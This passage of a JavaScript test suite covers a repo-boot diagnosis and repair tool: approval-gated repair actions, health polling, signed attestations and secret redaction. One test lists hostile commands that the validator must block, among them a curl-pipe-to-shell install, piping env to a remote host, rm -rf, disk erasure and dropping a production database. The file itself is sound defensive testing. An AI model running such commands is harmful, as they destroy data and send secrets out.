  ), { homebrewAvailable: true, homebrewPrefix: homebrew });
  assert.equal(versionStart.action.command.display, "brew services start postgresql@17");
  assert.equal(versionStart.action.mutationScope, "service");
  assert.equal(versionStart.action.riskLevel, "high");
  candidates.push(versionStart);

  fs.writeFileSync(
    path.join(config, "database.yml"),
    ["main:", "  adapter: postgresql", "geo:", "  adapter: postgresql", "embedding:", "  adapter: postgresql", ""].join("\n"),
  );
  const unsupportedConfig = deterministicRepairCandidateFor(attestation(
    "unsupported_database_config",
    "unsupported database names in 'config/database.yml': geo, embedding\nSupported database names: main, ci",
  ), { repoPath: repo });
  assert.equal(unsupportedConfig.action.actionType, "patch");
  assert.equal(unsupportedConfig.action.mutationScope, "repo");
  assert.equal(unsupportedConfig.action.riskLevel, "medium");
  assert.match(unsupportedConfig.action.patch.content, /-geo:/);
  assert.match(unsupportedConfig.action.patch.content, /-embedding:/);
  candidates.push(unsupportedConfig);

  const redis = deterministicRepairCandidateFor(attestation(
    "redis_unavailable",
    "Redis::CannotConnectError Connection refused - connect(2) for 127.0.0.1:6379",
  ), { homebrewAvailable: true });
  assert.equal(redis.action.command.display, "brew services start redis");
  assert.equal(redis.action.mutationScope, "service");
  assert.equal(redis.action.riskLevel, "medium");
  candidates.push(redis);

  for (const candidate of candidates) {
    for (const action of [candidate.action, ...(candidate.followUpActions ?? [])]) {
      assert.equal(validateRepairAction(action).valid, true, `${candidate.id}: ${action.explanation}`);
      if (action.actionType === "command" || action.actionType === "patch") {
        assert.equal(action.requiresApproval, true);
      }
    }
  }
});

test("expanded repair patches refuse stale destinations, secrets, and unsupported sections", () => {
  const attestation = (failureClass, failureEvidence) => ({
    result: {
      booted: false,
      healthVerified: false,
      failureClass,
      failureEvidence,
      explanation: failureEvidence,
    },
  });
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), "bp-refused-repairs-"));
  const config = path.join(repo, "config");
  fs.mkdirSync(config);
  fs.writeFileSync(path.join(config, "database.yml.example"), "development:\n");
  fs.writeFileSync(path.join(config, "database.yml"), "existing:\n");
  assert.equal(deterministicRepairCandidateFor(attestation(
    "missing_database_config",
    "Could not load database configuration",
  ), { repoPath: repo }), null, "an existing destination must never be overwritten");

  fs.rmSync(path.join(config, "database.yml"));
  fs.writeFileSync(
    path.join(config, "database.yml.example"),
    "development:\n  password: ordinary-but-real-secret\n",
  );
  assert.equal(deterministicRepairCandidateFor(attestation(
    "missing_database_config",
    "Could not load database configuration",
  ), { repoPath: repo }), null, "a patch that would persist a secret must be refused");

  fs.writeFileSync(path.join(config, "database.yml"), "main:\n  adapter: postgresql\nanalytics:\n  adapter: postgresql\n");
  assert.equal(deterministicRepairCandidateFor(attestation(
    "unsupported_database_config",
    "unsupported database names in 'config/database.yml': analytics",
  ), { repoPath: repo }), null, "only geo and embedding are eligible for deterministic removal");

  if (process.platform !== "win32") {
    const linkedRepo = fs.mkdtempSync(path.join(os.tmpdir(), "bp-linked-config-repair-"));
    fs.symlinkSync(config, path.join(linkedRepo, "config"));
    assert.equal(deterministicRepairCandidateFor(attestation(
      "missing_database_config",
      "Could not load database configuration",
    ), { repoPath: linkedRepo }), null, "patch discovery must not traverse a symlinked config directory");
  }
});

test("deterministic repair progress requires verified health or a changed failure class", () => {
  const after = (failureClass, booted = false, healthVerified = false) => ({
    result: { failureClass, booted, healthVerified },
  });
  assert.equal(repairProgressed("missing_build_tool", after("missing_build_tool")), false);
  assert.equal(repairProgressed("missing_build_tool", after("missing_env_var")), true);
  assert.equal(repairProgressed("missing_build_tool", after(null, true, true)), true);
  assert.equal(repairProgressed("missing_build_tool", null), false);
});

test("deterministic repair safety rejects dangerous commands without executing them", () => {
  const commands = [
    createRepairCommand("sudo", ["brew", "install", "cmake"]),
    createRepairCommand("rm", ["-rf", "/tmp/bootproof-test"]),
    createRepairCommand("/usr/bin/sudo", ["brew", "install", "cmake"]),
    createRepairCommand("/bin/rm", ["-fr", "/tmp/bootproof-test"]),
    { executable: "curl", args: ["https://example.invalid/install", "|", "sh"], display: "curl https://example.invalid/install | sh" },
    createRepairCommand("tee", [".env"]),
    createRepairCommand("chmod", ["-R", "777", "."]),
    createRepairCommand("chown", ["-R", "user", "."]),
    createRepairCommand("mkfs", ["/dev/disk9"]),
    createRepairCommand("diskutil", ["eraseDisk", "APFS", "scratch", "/dev/disk9"]),
    createRepairCommand("dropdb", ["production"]),
    createRepairCommand("psql", ["-c", "DROP DATABASE production"]),
    { executable: "env", args: ["|", "curl", "https://example.invalid"], display: "env | curl https://example.invalid" },
  ];
  const mockExecutorCalls = [];
  for (const command of commands) {
    const result = validateRepairCommand(command);
    if (result.valid) mockExecutorCalls.push(command.display);
    assert.equal(result.valid, false, command.display);
  }
  assert.deepEqual(mockExecutorCalls, [], "blocked commands must never reach even a mock executor");
});

test("deterministic repair actions reject missing approval and unknown action types", () => {
  const command = buildRepairAction({
    actionType: "command",
    mutationScope: "host",
    riskLevel: "medium",
    command: createRepairCommand("rbenv", ["install", "3.3.11"]),
    explanation: "Install the exact required Ruby version.",
    evidenceRefs: [".bootproof/attestation.json"],
  });
  assert.equal(validateRepairAction({ ...command, requiresApproval: false }).valid, false);
  assert.match(validateRepairAction({ ...command, requiresApproval: false }).errors.join("\n"), /always require approval/);
  assert.equal(validateRepairAction({ ...command, actionType: "script" }).valid, false);
  assert.match(validateRepairAction({ ...command, actionType: "script" }).errors.join("\n"), /unknown action type/);
});

test("repair receipt safety base serializes with lifecycle fields", () => {
  const action = buildRepairAction({
    actionType: "instruction",
    mutationScope: "none",
    riskLevel: "low",
    instruction: "Set RAILS_ENV=development for the next local run.",
    explanation: "RAILS_ENV has a known safe local development value.",
    evidenceRefs: [".bootproof/attestation.json"],
  });
  const receipt = buildRepairReceiptBase({
    repairId: "set-safe-rails-env-instruction",
    createdAt: "2026-06-12T10:00:00.000Z",
    bootproofVersion: "0.3.0",
    beforeFailureClass: "missing_env_var",
    beforeEvidenceHash: "a".repeat(64),
    proposedAction: action,
    explanation: "Instruction only; no environment file was written.",
  });
  const serialized = serializeRepairReceiptBase(receipt);
  const parsed = JSON.parse(serialized);
  assert.equal(parsed.schema, "bootproof/repair-receipt/v1");
  assert.equal(parsed.actionType, "instruction");
  assert.equal(parsed.userApprovalRequired, true);
  assert.equal(parsed.applyResult.status, "not_applied");
  assert.equal(parsed.progressed, false);
  assert.equal(parsed.verified, false);
});

test("repair safety JSON schemas are strict machine interfaces", () => {
  const actionSchema = JSON.parse(fs.readFileSync(path.join("docs", "schemas", "repair-action-v1.schema.json"), "utf8"));
  const receiptSchema = JSON.parse(fs.readFileSync(path.join("docs", "schemas", "repair-receipt-v1.schema.json"), "utf8"));
  assert.equal(actionSchema.additionalProperties, false);
  assert.equal(actionSchema.properties.source.const, "deterministic_playbook");
  assert.ok(actionSchema.required.includes("requiresApproval"));
  assert.equal(receiptSchema.additionalProperties, false);
  assert.equal(receiptSchema.properties.schema.const, "bootproof/repair-receipt/v1");
  assert.ok(receiptSchema.required.includes("proposedAction"));
  assert.ok(receiptSchema.required.includes("userApprovalRequired"));
});

test("repair registry exposes only deterministic v0.3 remediations", () => {
  assert.deepEqual(registeredRemediationsFor("service_port_allocated"), [{
    id: "remap-conflicting-service-port",
    kind: "plan-step",
  }]);
  assert.deepEqual(registeredRemediationsFor("package_manager_version_mismatch"), [{
    id: "activate-declared-package-manager",
    kind: "environment",
  }]);
  assert.deepEqual(registeredRemediationsFor("migrations_missing"), [{
    id: "apply-framework-migrations",
    kind: "plan-step",
  }]);
  assert.deepEqual(registeredRemediationsFor("missing_env_var"), []);
  assert.equal(
    packageManagerActivationCommand("pnpm", "10.24.0"),
    "corepack prepare pnpm@10.24.0 --activate",
  );
  assert.equal(packageManagerActivationCommand("pnpm", "^10.24.0"), null);
  const repairedCompose = composePortRepair(
    "services:\n  web:\n    build: .\n    ports:\n      - \"4000:3000\"\n",
    "web",
    4000,
    4100,
    3000,
  );
  assert.match(repairedCompose, /complete repaired copy/);
  assert.match(repairedCompose, /4100:3000/);
  assert.doesNotMatch(repairedCompose, /!override/);
  assert.match(repairedCompose, /build: \./);
  assert.equal(repoComposeRepairFile("docker/docker-compose.yml"), "docker/docker-compose.bootproof.override.yml");
  const prisma = fs.mkdtempSync(path.join(os.tmpdir(), "bp-repair-prisma-"));
  fs.mkdirSync(path.join(prisma, "prisma"), { recursive: true });
  assert.equal(prismaRepairCommand(prisma), "npx prisma db push --skip-generate");
  fs.mkdirSync(path.join(prisma, "prisma", "migrations"));
  assert.equal(prismaRepairCommand(prisma), "npx prisma migrate deploy");

  const django = fs.mkdtempSync(path.join(os.tmpdir(), "bp-repair-django-"));
  fs.writeFileSync(path.join(django, "manage.py"), "");
  fs.writeFileSync(path.join(django, "requirements.txt"), "Django==5.2.1\n");
  assert.deepEqual(
    migrationRepairFor(django, "django.db.utils.OperationalError: no such table: app_widget"),
    {
      id: "apply-django-migrations",
      framework: "django",
      command: "python manage.py migrate --noinput",
      source: "manage.py and declared Django dependency",
    },
  );

  const rails = fs.mkdtempSync(path.join(os.tmpdir(), "bp-repair-rails-"));
  fs.mkdirSync(path.join(rails, "bin"), { recursive: true });
  fs.writeFileSync(path.join(rails, "bin", "rails"), "");
  fs.writeFileSync(path.join(rails, "Gemfile"), "gem \"rails\"\n");
  assert.equal(
    migrationRepairFor(rails, "ActiveRecord::PendingMigrationError Migrations are pending").command,
    "bundle exec rails db:migrate",
  );

  const knex = fs.mkdtempSync(path.join(os.tmpdir(), "bp-repair-knex-"));
  fs.writeFileSync(path.join(knex, "knexfile.js"), "module.exports = {};\n");
  fs.writeFileSync(path.join(knex, "package.json"), JSON.stringify({ dependencies: { knex: "3.1.0" } }));
  assert.equal(
    migrationRepairFor(knex, "Knex: no such table: widgets").command,
    "npx knex migrate:latest",
  );

  const drizzle = fs.mkdtempSync(path.join(os.tmpdir(), "bp-repair-drizzle-"));
  fs.writeFileSync(path.join(drizzle, "drizzle.config.ts"), "export default {};\n");
  fs.writeFileSync(path.join(drizzle, "package.json"), JSON.stringify({ devDependencies: { "drizzle-kit": "0.31.0" } }));
  assert.equal(
    migrationRepairFor(drizzle, "Drizzle migration pending: relation widgets does not exist").command,
    "npx drizzle-kit migrate",
  );

  fs.mkdirSync(path.join(django, "prisma"), { recursive: true });
  fs.writeFileSync(path.join(django, "prisma", "schema.prisma"), "");
  assert.equal(
    migrationRepairFor(django, "no such table: app_widget"),
    null,
    "multiple matching migration frameworks must refuse instead of guessing",
  );
  assert.equal(
    migrationRepairFor(fs.mkdtempSync(path.join(os.tmpdir(), "bp-repair-no-framework-")), "no such table: app_widget"),
    null,
    "migration evidence without an exact framework marker must not produce a command",
  );
});

test("repair receipt schema and honesty additions are documented", () => {
  const schema = fs.readFileSync(path.resolve("docs/REPAIR_RECEIPT.md"), "utf8");
  assert.match(schema, /bootproof\/repair-receipt\/v1/);
  assert.match(schema, /bootproof apply-repair/);
  assert.match(schema, /fileChanges/);
  assert.match(schema, /preconditions/);
  assert.match(schema, /beforeAttestationSha256/);
  const honesty = fs.readFileSync(path.resolve("docs/HONESTY_CONTRACT.md"), "utf8");
  assert.match(honesty, /signature-valid classified failed attestation/i);
  assert.match(honesty, /only after .* user types uppercase `Y`/i);
  assert.match(honesty, /repair generation never patches the user's working tree/i);
  assert.match(honesty, /application logic is never edited/i);
  assert.match(honesty, /Declined, failed, progressed, and verified/i);
  assert.match(honesty, /stale or tampered receipts write nothing/i);
});

test("package manager version preflight compares only exact declarations conservatively", () => {
  assert.equal(packageManagerVersionMatches("10.24.0", "10.24.0"), true);
  assert.equal(packageManagerVersionMatches("10.24", "10.24.7"), true);
  assert.equal(packageManagerVersionMatches("10.24", "9.15.4"), false);
  assert.equal(packageManagerVersionMatches("^10.24.0", "9.15.4"), true, "ranges are left to the package manager");
});

test("health candidates are extracted from common application log formats", () => {
  assert.deepEqual(
    extractHealthCandidates("Local: http://127.0.0.1:5173/\nserver listening on port 8088\nserver listening on 9090"),
    ["http://127.0.0.1:5173/", "http://localhost:8088/", "http://localhost:9090/"],
  );
});

test("execution environment preserves parent variables and applies explicit overrides", () => {
  const names = [
    "BOOTPROOF_PARENT_TEST",
    "RAILS_ENV",
    "NODE_ENV",
    "DATABASE_URL",
    "REDIS_URL",
    "BUNDLE_PATH",
    "GEM_HOME",
    "RBENV_VERSION",
    "RUBYOPT",
  ];
  const before = Object.fromEntries(names.map(name => [name, process.env[name]]));
  try {
    process.env.BOOTPROOF_PARENT_TEST = "inherited";
    process.env.RAILS_ENV = "development";
    process.env.NODE_ENV = "test";
    process.env.DATABASE_URL = "postgresql://localhost/app";
    process.env.REDIS_URL = "redis://localhost:6379";
    process.env.BUNDLE_PATH = "/tmp/bundle";
    process.env.GEM_HOME = "/tmp/gems";
    process.env.RBENV_VERSION = "3.3.0";
    process.env.RUBYOPT = "-W0";

    const env = buildExecutionEnv({ PORT: "6006", NODE_ENV: "development" });
    assert.equal(env.PATH, process.env.PATH);
    assert.equal(env.HOME, process.env.HOME);
    assert.equal(env.SHELL, process.env.SHELL);
    assert.equal(env.BOOTPROOF_PARENT_TEST, "inherited");
    assert.equal(env.RAILS_ENV, "development");
    assert.equal(env.NODE_ENV, "development");
    assert.equal(env.DATABASE_URL, "postgresql://localhost/app");
    assert.equal(env.REDIS_URL, "redis://localhost:6379");
    assert.equal(env.BUNDLE_PATH, "/tmp/bundle");
    assert.equal(env.GEM_HOME, "/tmp/gems");
    assert.equal(env.RBENV_VERSION, "3.3.0");
    assert.equal(env.RUBYOPT, "-W0");
    assert.equal(env.PORT, "6006");
    assert.equal(env.CI, "true");
    assert.equal(env.BOOTPROOF, "1");
  } finally {
    for (const [name, value] of Object.entries(before)) {
      if (value === undefined) delete process.env[name];
      else process.env[name] = value;
    }
  }
});

test("leading command environment assignments are extracted without changing the recorded command", () => {
  assert.deepEqual(
    extractLeadingEnvironmentAssignments("RAILS_ENV=development NODE_ENV='test mode' node server.js"),
    {
      command: "node server.js",
      environment: {
        RAILS_ENV: "development",
        NODE_ENV: "test mode",
      },
    },
  );
  assert.deepEqual(
    extractLeadingEnvironmentAssignments("node server.js"),
    { command: "node server.js", environment: {} },
  );
});

test("failed process evidence extracts Rails and PostgreSQL root causes deterministically", () => {
  const rails = extractProcessEvidence(
    "config/database.yml is missing (RuntimeError)\n/app/config/application.rb:1:in 'boot'\n",
    "/app/vendor/bundle/rails.rb:99:in 'run'\n",
  );
  assert.equal(rails.firstErrorLine, "config/database.yml is missing (RuntimeError)");
  assert.equal(rails.firstExceptionLine, "config/database.yml is missing (RuntimeError)");
  assert.equal(rails.detectedCause, "missing config/database.yml");

  const cases = [
    ["config/gitlab.yml does not exist (RuntimeError)", "missing config/gitlab.yml"],
    ["PG::ConnectionBad: connection refused for PostgreSQL on port 5432", "PostgreSQL connection refused"],
    ['PG::ConnectionBad: FATAL: role "gitlab" does not exist', "PostgreSQL role missing"],
    ['ActiveRecord::StatementInvalid: PG::UndefinedTable: relation "users" does not exist', "database schema missing"],
    ["Unsupported PostgreSQL database version 13", "unsupported database version"],
    ["Unsupported database configuration: load_balancing", "unsupported database configuration"],
  ];
  for (const [line, expected] of cases) {
    assert.equal(extractProcessEvidence(line, "").detectedCause, expected);
  }
});

test("health verification accepts HTTP 200 and preserves response evidence", async () => {
  await withHttpServer((_request, response) => {
    response.setHeader("x-bootproof-test", "ready");
    response.statusCode = 200;
    response.end("healthy");
  }, async url => {
    const health = await pollHealth(url, 1000, 20);
    assert.equal(health.responded, true);
    assert.equal(health.evidence.acceptedAsHealthy, true);
    assert.equal(health.evidence.statusCode, 200);
    assert.equal(health.evidence.statusText, "OK");
    assert.equal(health.evidence.headers["x-bootproof-test"], "ready");
    assert.equal(health.evidence.bodyExcerpt, "healthy");
    assert.equal(health.evidence.connectionError, null);
    assert.ok(!Number.isNaN(Date.parse(health.evidence.timestamp)));
  });
});

test("health verification accepts HTTP 204", async () => {
  await withHttpServer((_request, response) => {
    response.statusCode = 204;
    response.end();
  }, async url => {
    const health = await pollHealth(url, 1000, 20);
    assert.equal(health.evidence.statusCode, 204);
    assert.equal(health.evidence.acceptedAsHealthy, true);
    assert.equal(health.evidence.bodyExcerpt, "");
  });
});

test("health verification accepts HTTP 302 to /users/sign_in without following it", async () => {
  let requests = 0;
  await withHttpServer((_request, response) => {
    requests++;
    response.writeHead(302, { location: "/users/sign_in" });
    response.end("redirect");
  }, async url => {
    const health = await pollHealth(url, 1000, 20);
    assert.equal(requests, 1);
    assert.equal(health.evidence.statusCode, 302);
    assert.equal(health.evidence.statusText, "Found");
    assert.equal(health.evidence.redirectLocation, "/users/sign_in");
    assert.equal(health.evidence.acceptedAsHealthy, true);
  });
});

test("health verification accepts HTTP 302 to /login", async () => {
  await withHttpServer((_request, response) => {
    response.writeHead(302, { location: "/login" });
    response.end();
  }, async url => {
    const health = await pollHealth(url, 1000, 20);
    assert.equal(health.evidence.statusCode, 302);
    assert.equal(health.evidence.redirectLocation, "/login");
    assert.equal(health.evidence.acceptedAsHealthy, true);
  });
});

test("health verification rejects HTTP 500 and preserves response evidence", async () => {
  await withHttpServer((_request, response) => {
    response.statusCode = 500;
    response.end("server failed");
  }, async url => {
    const health = await pollHealth(url, 80, 10);
    assert.equal(health.responded, true);
    assert.equal(health.evidence.statusCode, 500);
    assert.equal(health.evidence.statusText, "Internal Server Error");
    assert.equal(health.evidence.bodyExcerpt, "server failed");
    assert.equal(health.evidence.acceptedAsHealthy, false);
  });
});

test("health verification rejects connection refusal and preserves connection evidence", async () => {
  const port = await getFreePort();
  const url = `http://127.0.0.1:${port}/`;
  const health = await pollHealth(url, 80, 10);
  assert.equal(health.responded, false);
  assert.equal(health.evidence.requestedUrl, url);
  assert.equal(health.evidence.statusCode, null);
  assert.equal(health.evidence.acceptedAsHealthy, false);
  assert.match(health.evidence.connectionError, /ECONNREFUSED|connect/i);
});

test("health verification replaces a transient 500 with a later healthy 302", async () => {
  let requests = 0;
  await withHttpServer((_request, response) => {
    requests++;
    if (requests === 1) {
      response.statusCode = 500;
      response.end("warming up");
      return;
    }
    response.writeHead(302, { location: "/users/sign_in" });
    response.end("ready");
  }, async url => {
    const health = await pollHealth(url, 1000, 20);
    assert.ok(requests >= 2);
    assert.equal(health.evidence.statusCode, 302);
    assert.equal(health.evidence.redirectLocation, "/users/sign_in");
    assert.equal(health.evidence.bodyExcerpt, "ready");
    assert.equal(health.evidence.acceptedAsHealthy, true);
    assert.doesNotMatch(JSON.stringify(health.evidence), /500|warming up/);
  });
});

test("supervisor stop terminates the process tree and releases its port", async () => {
  const port = await getFreePort();
  const app = superviseApp(
    "node server.js",
    path.join(FIX, "hello-app"),
    buildExecutionEnv({ PORT: String(port) }),
  );
  const health = await pollHealth(`http://127.0.0.1:${port}/`, 10_000, 100);
  assert.equal(health.responded, true, "fixture server must start before cleanup is tested");

  await app.stop();

  assert.equal(await waitForPortRelease(port), true, `port ${port} remained bound after supervisor stop`);
});

test("remote URL parsing accepts only credential-free HTTPS repositories from named providers", () => {
  assert.equal(isRemoteTarget("https://github.com/example/app"), true);
  assert.deepEqual(parseGithubRemote("https://github.com/example/app"), {
    originalUrl: "https://github.com/example/app",
    canonicalUrl: "https://github.com/example/app.git",
    owner: "example",
    repo: "app",
  });
  assert.deepEqual(parseRemoteTarget("https://gitlab.com/example/platform/app"), {
    originalUrl: "https://gitlab.com/example/platform/app",
    canonicalUrl: "https://gitlab.com/example/platform/app.git",
    provider: "gitlab",
    host: "gitlab.com",
    namespace: "example/platform",
    repo: "app",
  });
  assert.equal(parseRemoteTarget("https://bitbucket.org/example/app").provider, "bitbucket");
  assert.equal(parseRemoteTarget("https://codeberg.org/example/app.git").provider, "codeberg");
  assert.throws(() => parseGithubRemote("http://github.com/example/app"), /accepts credential-free HTTPS/);
  assert.throws(() => parseGithubRemote("https://token@github.com/example/app"), /must not contain credentials/);
  assert.throws(() => parseGithubRemote("https://gitlab.com/example/app"), /Expected a public HTTPS GitHub/);
  assert.throws(() => parseRemoteTarget("https://example.com/example/app"), /GitHub, GitLab, Bitbucket, or Codeberg/);
  assert.throws(() => parseRemoteTarget("https://gitlab.com/example/app/-/tree/main"), /unsupported characters/);
  assert.throws(() => parseGithubRemote("https://github.com/example/app/tree/main"), /exactly one .*repository/);

  const managed = fs.mkdtempSync(path.join(os.tmpdir(), "bp-managed-remote-"));
  const repo = path.join(managed, "repo");
  fs.mkdirSync(repo);
  fs.writeFileSync(path.join(managed, "source.json"), JSON.stringify({
    schema: "bootproof/remote-source/v1",
    canonicalUrl: "https://github.com/example/app.git",
    repoDirectory: "repo",
  }));
  assert.equal(managedRemoteSource(repo), "https://github.com/example/app.git");
  assert.equal(managedRemoteSource(path.join(managed, "ordinary-repo")), null);
});

test("env example never invents secrets", () => {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "bp-"));
  fs.writeFileSync(path.join(tmp, "package.json"), JSON.stringify({ name: "x", scripts: { dev: "node s.js" } }));
  fs.writeFileSync(path.join(tmp, ".env.example"), "PORT=4000\nAPI_SECRET=\nDATABASE_URL=\n");
  const inf = inferRepo(tmp);
  const ex = envExampleFor(inf);
  assert.match(ex, /# API_SECRET= \(secret with no safe local default/);
  assert.doesNotMatch(ex, /API_SECRET=[a-zA-Z0-9]/, "must not fabricate a secret value");
});

test("plan never targets protected env files", () => {
  const inf = inferRepo(path.join(FIX, "hello-app"));
  const plan = buildPlan(inf, "docker");
  for (const f of plan.generatedFiles) assert.ok(!PROTECTED_ENV.includes(f.path), `${f.path} is protected`);
});

test("attestation signature verifies and tamper is detected", () => {
  const inf = inferRepo(path.join(FIX, "hello-app"));
  const plan = buildPlan(inf, "local");
  const att = buildAttestation({ repo: inf.repoPath, plan, observed: [], startedAt: new Date().toISOString(), booted: false, healthVerified: false, healthObservation: null, failureClass: "unknown_failure", failureEvidence: "x", explanation: "test" });
  assert.deepEqual(att.trust, { level: "local_developer_signed", signer: "local_ed25519", oidc: null });
  assert.equal(verifySignature(att), true);
  att.result.booted = true; // tamper: claim it booted
  assert.equal(verifySignature(att), false, "a tampered 'booted' claim must fail signature verification");
  att.result.booted = false;
  att.trust.level = "ci_oidc_signed"; // tamper: upgrade local proof to a stronger trust claim
  assert.equal(verifySignature(att), false, "a tampered trust level must fail signature verification");
});

test("redaction masks secrets, urls credentials and home paths", async () => {
  const { redactText } = await import("../dist/redact.js");
  const r = redactText("DATABASE_URL=postgresql://admin:SuperSecret@db:5432/x STRIPE_SECRET_KEY=sk_live_abc123 in /Users/ross/code");
  assert.doesNotMatch(r.text, /SuperSecret|sk_live_abc123|\/Users\/ross/);
  assert.match(r.text, /\[redacted\]/);
  assert.ok(r.applied.length >= 2);
});

test("registry entry: redacted, re-signed, tamper-detectable", async () => {
  const { buildRegistryEntry, verifyRegistryEntry } = await import("../dist/registry.js");
  const inf = inferRepo(path.join(FIX, "hello-app"));
  const plan = buildPlan(inf, "local");
  const att = buildAttestation({ repo: inf.repoPath, plan, observed: [], startedAt: new Date().toISOString(), booted: false, healthVerified: false, healthObservation: null, failureClass: "database_unreachable", failureEvidence: "postgresql://admin:Pw123@host/db refused", explanation: "t" });
  const entry = buildRegistryEntry(att, { inference: inf, sign: true });
  assert.doesNotMatch(JSON.stringify(entry), /Pw123/, "registry entry must not leak credentials");
  assert.equal(verifyRegistryEntry(entry), true);
  entry.verified = true;
  assert.equal(verifyRegistryEntry(entry), false, "tampered registry entry must fail verification");
});

test("registry and federated exports are stable, strict, redacted, local-only builders", async () => {
  const {
    buildFederatedReceipt,
    buildRegistryEntry,
    validateFederatedReceipt,
    validateRegistryEntry,
  } = await import("../dist/registry.js");
  const inf = inferRepo(path.join(FIX, "hello-app"));
  const plan = buildPlan(inf, "local");
  const start = plan.steps.find(step => step.kind === "start-app");
  assert.ok(start);
  start.command = "RAILS_ENV=development API_TOKEN=top-secret bundle exec rails server --config /Users/alice/private/app.yml";
  const att = buildAttestation({
    repo: inf.repoPath,
    plan,
    observed: [{
      id: "start-app",
      kind: "start-app",
      command: start.command,
      startedAt: "2026-01-01T00:00:00.000Z",
      finishedAt: "2026-01-01T00:00:01.000Z",
      exitCode: 1,
      ok: false,
      observation: "app exited",
      evidenceHead: "API_TOKEN=top-secret\n-----BEGIN PRIVATE KEY-----\nprivate-material\n-----END PRIVATE KEY-----\n/Users/alice/private/app",
      evidenceTail: "DATABASE_URL=postgresql://admin:db-password@localhost/app refused in /Users/alice/private/app",
    }],
    startedAt: "2026-01-01T00:00:00.000Z",
    booted: false,
    healthVerified: false,
    healthObservation: "only HTTP 500 observed",
    healthEvidence: {
      requestedUrl: "http://localhost:3000/users/42?token=raw-token",
      statusCode: 500,
      statusText: "Internal Server Error",
      headers: {},
      redirectLocation: "/login?token=raw-token",
      bodyExcerpt: "",
      timestamp: "2026-01-01T00:00:02.000Z",
      acceptedAsHealthy: false,
      connectionError: null,
    },
    failureClass: "postgres_unavailable",
    failureEvidence: "DATABASE_URL=postgresql://admin:db-password@localhost/app refused",
    explanation: "failed",
  });
  att.repo.path = "/Users/alice/private/app";
  att.repo.remote = "https://github.com/acme/example.git";
  att.repo.commit = "0123456789abcdef";

  const buildOptions = {
    registryMode: "federated_public_candidate",
    inference: inf,
    branch: "main",
    createdAt: "2026-01-02T03:04:05.000Z",
  };
  const before = fs.existsSync(path.join(inf.repoPath, ".bootproof"));
  const originalFetch = globalThis.fetch;
  let fetchCalls = 0;
  globalThis.fetch = async () => {
    fetchCalls++;
    throw new Error("registry export must not call fetch");
  };
  let entry;
  let second;
  try {
    entry = buildRegistryEntry(att, buildOptions);
    second = buildRegistryEntry(att, buildOptions);
  } finally {
    globalThis.fetch = originalFetch;
  }

  assert.equal(fetchCalls, 0);
  assert.equal(fs.existsSync(path.join(inf.repoPath, ".bootproof")), before, "builders must not write files");
  assert.equal(entry.schema, "bootproof/registry-entry/v1");
  assert.equal(entry.optInRequired, true);
  assert.equal(entry.registryMode, "federated_public_candidate");
  assert.equal(entry.publicRepoHint, "https://github.com/acme/example");
  assert.equal(entry.healthStatus, "unhealthy");
  assert.equal(entry.healthUrlPattern, "http://localhost:<port>/users/:id");
  assert.equal(entry.healthRedirectLocationPattern, "/login");
  assert.equal(entry.repoFingerprint, second.repoFingerprint);
  assert.equal(entry.selectedCommandHash, second.selectedCommandHash);
  assert.equal(entry.failureEvidenceFingerprint, second.failureEvidenceFingerprint);
  assert.equal(entry.attestationHash, second.attestationHash);
  assert.equal(entry.signature, undefined, "pure builders are unsigned unless an explicit export requests signing");
  assert.deepEqual(validateRegistryEntry(entry), []);

  const serialized = JSON.stringify(entry);
  assert.doesNotMatch(serialized, /top-secret|db-password|private-material|\/Users\/alice|RAILS_ENV=development/);
  assert.match(entry.selectedCommandRedacted, /RAILS_ENV=\[redacted\]/);
  assert.match(entry.evidenceHeadRedacted, /\[redacted-private-key\]/);

  const privateRemoteAttestation = structuredClone(att);
  privateRemoteAttestation.repo.remote = "git@code.example.internal:platform/private-app.git";
  const privateEntry = buildRegistryEntry(privateRemoteAttestation, buildOptions);
  assert.equal(privateEntry.repoHost, "code.example.internal");
  assert.equal(privateEntry.publicRepoHint, undefined);
  assert.doesNotMatch(JSON.stringify(privateEntry), /platform\/private-app|private-app\.git/);

  const receipt = buildFederatedReceipt(entry, { createdAt: "2026-01-02T03:04:05.000Z" });
  assert.equal(receipt.schema, "bootproof/federated-receipt/v1");
  assert.equal(receipt.publicRepoDeclaration, true);
  assert.equal(receipt.noSecretsIncluded, true);
  assert.equal(receipt.crawlerHint.repoUrl, "https://github.com/acme/example");
  assert.equal(receipt.signature, undefined);
  assert.deepEqual(validateFederatedReceipt(receipt), []);
  assert.doesNotMatch(JSON.stringify(receipt), /top-secret|db-password|private-material|\/Users\/alice/);
});

test("registry JSON schemas are strict v1 machine interfaces", () => {
  const registrySchema = JSON.parse(fs.readFileSync(path.join("docs", "schemas", "registry-entry-v1.schema.json"), "utf8"));
  const federatedSchema = JSON.parse(fs.readFileSync(path.join("docs", "schemas", "federated-receipt-v1.schema.json"), "utf8"));
  assert.equal(registrySchema.additionalProperties, false);
  assert.equal(registrySchema.properties.schema.const, "bootproof/registry-entry/v1");
  assert.ok(registrySchema.required.includes("optInRequired"));
  assert.equal(federatedSchema.additionalProperties, false);
  assert.equal(federatedSchema.properties.schema.const, "bootproof/federated-receipt/v1");
  assert.ok(federatedSchema.required.includes("noSecretsIncluded"));
});

test("ported: docker bind path normalization (windows + wsl2 literals)", async () => {
  const { normalizeDockerBindPath } = await import("../dist/platform.js");
  assert.equal(normalizeDockerBindPath("C:\\Users\\Ross\\app", "windows"), "/c/Users/Ross/app");
  assert.equal(normalizeDockerBindPath("/mnt/c/Users/Ross/app", "wsl2"), "/mnt/c/Users/Ross/app");
  assert.equal(normalizeDockerBindPath("/home/ross/app", "linux"), "/home/ross/app");
});

test("ported: postgres auth taxonomy from cal.com lessons", () => {
  assert.equal(classifyFailure("SASL: SCRAM-SERVER-FIRST-MESSAGE: client password must be a string").class, "postgres_auth_env_missing");
  assert.equal(classifyFailure("FATAL: password authentication failed for user calendso").class, "postgres_auth_env_missing");
});
